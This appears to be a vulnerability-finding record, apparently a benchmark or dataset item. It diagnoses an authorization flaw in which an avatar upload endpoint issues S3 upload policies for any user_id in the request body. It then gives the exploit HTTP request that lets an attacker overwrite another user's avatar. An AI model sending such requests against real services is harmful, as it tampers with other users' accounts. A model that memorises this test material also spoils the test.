diagnosis: The handler generates a presigned S3 POST policy for uploading a user avatar using the user_id provided in the JSON request body. It fails to validate that the provided user_id matches current_user.id, allowing an attacker to overwrite another user's avatar image.
exploit_request:
POST /api/avatars/upload-policy HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"user_id": 1}
